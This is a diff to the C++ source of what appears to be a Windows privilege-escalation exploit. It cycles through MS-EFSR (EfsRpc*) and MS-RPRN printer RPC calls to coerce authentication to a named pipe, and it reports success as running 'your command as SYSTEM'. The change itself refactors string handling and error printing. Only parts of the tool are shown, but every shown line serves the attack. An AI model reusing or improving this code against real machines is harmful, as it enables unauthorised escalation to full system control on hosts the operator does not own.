@@ -48,8 +48,8 @@ wchar_t* generateRandomString() {
     return randomString;
 }
 
-void handleError(std::wstring function, long result) {
-    wprintf(L"[error] %s returned (%d): %s\r\n", function, result, lookup_error_with_nameW(result));
+void handleError(const wchar_t* function, long result) {
+    wprintf(L"[error] %ls returned (%d): %ls\r\n", function, result, lookup_error_with_nameW(result));
 
     if (result == 53) {
         wprintf(L" -> [+] Exploit worked, it should execute your command as SYSTEM!\r\n");
@@ -312,21 +312,21 @@ long CallEfsrFunctions(RPC_BINDING_HANDLE Binding, int exploitID, bool force, st
         [&]() { return callEfsRpcQueryProtectors(Binding, targetedPipeName); }
     };
 
-    std::wstring functionNames[] = {
-        L"EfsRpcOpenFileRaw",
-        L"EfsRpcEncryptFileSrv",
-        L"EfsRpcDecryptFileSrv",
-        L"EfsRpcQueryUsersOnFile",
-        L"EfsRpcQueryRecoveryAgents",
-        L"EfsRpcRemoveUsersFromFile",
-        L"EfsRpcAddUsersToFile",
-        L"EfsRpcFileKeyInfo",
-        L"EfsRpcDuplicateEncryptionInfoFile",
-        L"EfsRpcAddUsersToFileEx",
-        L"EfsRpcFileKeyInfoEx",
-        L"EfsRpcGetEncryptedFileMetadata",
-        L"EfsRpcEncryptFileExSrv",
-        L"EfsRpcQueryProtectors"
+    const wchar_t* functionNames[] = {
+        L" [MS-EFSR] EfsRpcOpenFileRaw",
+        L" [MS-EFSR] EfsRpcEncryptFileSrv",
+        L" [MS-EFSR] EfsRpcDecryptFileSrv",
+        L" [MS-EFSR] EfsRpcQueryUsersOnFile",
+        L" [MS-EFSR] EfsRpcQueryRecoveryAgents",
+        L" [MS-EFSR] EfsRpcRemoveUsersFromFile",
+        L" [MS-EFSR] EfsRpcAddUsersToFile",
+        L" [MS-EFSR] EfsRpcFileKeyInfo",
+        L" [MS-EFSR] EfsRpcDuplicateEncryptionInfoFile",
+        L" [MS-EFSR] EfsRpcAddUsersToFileEx",
+        L" [MS-EFSR] EfsRpcFileKeyInfoEx",
+        L" [MS-EFSR] EfsRpcGetEncryptedFileMetadata",
+        L" [MS-EFSR] EfsRpcEncryptFileExSrv",
+        L" [MS-EFSR] EfsRpcQueryProtectors"
     };
 
     int sizeOfFunctions = sizeof(functions) / sizeof(functions[0]);
@@ -336,7 +336,7 @@ long CallEfsrFunctions(RPC_BINDING_HANDLE Binding, int exploitID, bool force, st
             wprintf(L" [MS-EFSR] ");
             result = functions[i]();
 
-            handleError(wsprintf("%s%s", L" [MS-EFSR] ", functionNames[i]), result);
+            handleError(functionNames[i], result);
 
             if (result == 53 and !force) {
                 LocalFree(targetedPipeName);
@@ -347,7 +347,7 @@ long CallEfsrFunctions(RPC_BINDING_HANDLE Binding, int exploitID, bool force, st
     else {
         wprintf(L"[MS-EFSR] ");
         result = functions[exploitID]();
-        handleError(wsprintf("%s%s", L" [MS-EFSR] ", functionNames[exploitID]), result);
+        handleError(functionNames[exploitID], result);
     }
 
     LocalFree(targetedPipeName);
@@ -372,9 +372,9 @@ long callRprnFunctions(int exploitID, bool force, std::wstring randomNamedpipe) 
         [&]() { return callRpcRemoteFindFirstPrinterChangeNotification(targetedPipeName);
     } };
 
-    std::wstring functionNames[] = {
-        L"RpcRemoteFindFirstPrinterChangeNotificationEx",
-        L"RpcRemoteFindFirstPrinterChangeNotification"
+    const wchar_t * functionNames[] = {
+        L" [MS-RPRN] RpcRemoteFindFirstPrinterChangeNotificationEx",
+        L" [MS-RPRN] RpcRemoteFindFirstPrinterChangeNotification"
     };
 
     int sizeOfFunctions = sizeof(functions) / sizeof(functions[0]);
@@ -384,7 +384,7 @@ long callRprnFunctions(int exploitID, bool force, std::wstring randomNamedpipe) 
             wprintf(L" [MS-RPRN] ");
             result = functions[i]();
 
-            handleError(wsprintf("%s%s", L" [MS-RPRN] ", functionNames[i]), result);
+            handleError(functionNames[i], result);
 
             if (result == 0 and !force) {
                 LocalFree(targetedPipeName);
@@ -395,7 +395,7 @@ long callRprnFunctions(int exploitID, bool force, std::wstring randomNamedpipe) 
     else {
         wprintf(L"[MS-RPRN] ");
         result = functions[exploitID]();
-        handleError(wsprintf("%s%s", L" [MS-RPRN] ", functionNames[exploitID]), result);
+        handleError(functionNames[exploitID], result);
     }
 
     LocalFree(targetedPipeName);
